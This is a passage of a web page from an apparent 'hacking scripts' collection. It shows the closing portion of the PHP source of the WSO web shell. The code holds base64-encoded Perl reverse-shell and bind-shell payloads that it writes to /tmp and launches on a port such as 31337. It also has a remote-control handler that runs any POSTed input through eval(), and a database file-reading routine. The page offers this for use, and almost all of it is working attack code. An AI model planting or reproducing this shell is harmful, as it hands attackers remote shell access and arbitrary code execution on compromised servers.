<span class="lineno">1339</span>                                                                             <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">loadFile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1340</span>                                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1341</span>                                                                         <span class="p">}</span>
<span class="lineno">1342</span>                                                                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1343</span>                                                                         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">());</span>
<span class="lineno">1344</span>                                                                     <span class="p">}</span>
<span class="lineno">1345</span>                                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1346</span>                                                                     <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno">1347</span>                                                                 <span class="p">}</span>
<span class="lineno">1348</span>                                                                 <span class="k">function</span> <span class="nf">actionNetwork</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1349</span>                                                                     <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno">1350</span>                                                                     <span class="nv">$back_connect_p</span> <span class="o">=</span> <span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span>
<span class="lineno">1351</span>                                                                     <span class="nv">$bind_port_p</span> <span class="o">=</span> <span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&quot;</span><span class="p">;</span>
<span class="lineno">1352</span>                                                                     <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt;</span>
<span class="lineno">1353</span> <span class="s2">  &lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bpp&#39;,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno">1354</span> <span class="s2">  &lt;span&gt;Bind port to /bin/sh 1&lt;/span&gt;&lt;br/&gt;</span>
<span class="lineno">1355</span> <span class="s2">  Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; &lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;</span>
<span class="lineno">1356</span> <span class="s2">  &lt;/form&gt;</span>
<span class="lineno">1357</span> <span class="s2">  &lt;form name=&#39;nfp&#39; onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bcp&#39;,this.server.value,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno">1358</span> <span class="s2">  &lt;span&gt;Back-connect  1&lt;/span&gt;&lt;br/&gt;</span>
<span class="lineno">1359</span> <span class="s2">  Server: &lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt; Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; &lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;</span>
<span class="lineno">1360</span> <span class="s2">  &lt;/form&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1361</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1362</span>                                                                         <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1363</span>                                                                             <span class="nv">$w</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span>
<span class="lineno">1364</span>                                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$w</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1365</span>                                                                                 <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span>
<span class="lineno">1366</span>                                                                                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span>
<span class="lineno">1367</span>                                                                             <span class="p">}</span>
<span class="lineno">1368</span>                                                                         <span class="p">}</span>
<span class="lineno">1369</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpp&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1370</span>                                                                             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">,</span> <span class="nv">$bind_port_p</span><span class="p">);</span>
<span class="lineno">1371</span>                                                                             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bp.pl &quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; 1&gt;/dev/null 2&gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1372</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out</span><span class="s2"></span>
<span class="lineno">1373</span> <span class="s2">&quot;</span> <span class="o">.</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp.pl&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1374</span>                                                                             <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">);</span>
<span class="lineno">1375</span>                                                                         <span class="p">}</span>
<span class="lineno">1376</span>                                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1377</span>                                                                             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span> <span class="nv">$back_connect_p</span><span class="p">);</span>
<span class="lineno">1378</span>                                                                             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bc.pl &quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; 1&gt;/dev/null 2&gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1379</span>                                                                             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out</span><span class="s2"></span>
<span class="lineno">1380</span> <span class="s2">&quot;</span> <span class="o">.</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc.pl&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1381</span>                                                                             <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">);</span>
<span class="lineno">1382</span>                                                                         <span class="p">}</span>
<span class="lineno">1383</span>                                                                     <span class="p">}</span>
<span class="lineno">1384</span>                                                                     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1385</span>                                                                     <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno">1386</span>                                                                 <span class="p">}</span>
<span class="lineno">1387</span>                                                                 <span class="k">function</span> <span class="nf">actionRC</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1388</span>                                                                     <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">1389</span>                                                                         <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;uname&quot;</span> <span class="o">=&gt;</span> <span class="nb">php_uname</span><span class="p">(),</span> <span class="s2">&quot;php_version&quot;</span> <span class="o">=&gt;</span> <span class="nb">phpversion</span><span class="p">(),</span> <span class="s2">&quot;wso_version&quot;</span> <span class="o">=&gt;</span> <span class="nx">WSO_VERSION</span><span class="p">,</span> <span class="s2">&quot;safemode&quot;</span> <span class="o">=&gt;</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">));</span>
<span class="lineno">1390</span>                                                                         <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="lineno">1391</span>                                                                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1392</span>                                                                         <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno">1393</span>                                                                     <span class="p">}</span>
<span class="lineno">1394</span>                                                                 <span class="p">}</span>
<span class="lineno">1395</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span>
<span class="lineno">1396</span>                                                                 <span class="k">else</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">;</span>
<span class="lineno">1397</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
<span class="lineno">1398</span>                                                                 <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1399</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
